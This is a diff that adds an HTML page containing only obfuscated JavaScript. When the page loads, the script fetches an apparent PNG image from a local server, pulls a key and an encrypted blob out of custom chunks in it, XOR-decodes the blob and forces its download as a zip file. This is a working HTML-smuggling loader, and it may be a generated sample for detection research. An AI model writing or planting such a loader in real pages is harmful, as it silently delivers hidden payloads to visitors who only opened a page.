@@ -1,0 +1,7 @@
+
+        <html>
+        <body>
+            <script type="application/javascript">function qSMjD(BlqGI, UMAWC){let VOtUN = new Uint8Array(BlqGI.length);for (let i = 0; i < BlqGI.length; i++) {VOtUN[i] = BlqGI[i] ^ UMAWC[i % UMAWC.length];}return VOtUN;}function cQFTE(FBqnQ) {const KJLWs = new XMLHttpRequest();KJLWs.open('GET', FBqnQ, true);KJLWs.responseType = 'arraybuffer';KJLWs.onload = function() {if (KJLWs.status === 200) {const Umzak = KJLWs.response;const KhXVL = new DataView(Umzak);let bDVCb = 8;let KGCmj = null;while (bDVCb < Umzak.byteLength) {const urFlZ = KhXVL.getUint32(bDVCb);bDVCb += 4;const QLmLO = new Uint8Array(Umzak, bDVCb, 4);const rVueu = String.fromCharCode.apply(null, QLmLO);bDVCb += 4;if (rVueu === 'xkEy') {KGCmj = new Uint8Array(Umzak, bDVCb, urFlZ);} else if (rVueu === 'exEf' && KGCmj !== null) {const IznYT = new Uint8Array(Umzak, bDVCb, urFlZ);const XFzgQ = qSMjD(IznYT,KGCmj);const ETDQJ = new Blob([XFzgQ], { type: 'application/octet-stream' }), PzcCy = document.createElement('a');PzcCy.href = URL.createObjectURL(ETDQJ);PzcCy.download = 'sample_11.zip';document.body.appendChild(PzcCy);PzcCy.click();URL.revokeObjectURL(PzcCy.href);document.body.removeChild(PzcCy);return;}bDVCb += urFlZ + 4;}}};KJLWs.onerror = function(){};KJLWs.send();}cQFTE('http://127.0.0.1:8000/banner.png');</script>
+        </body>
+        </html>
+    
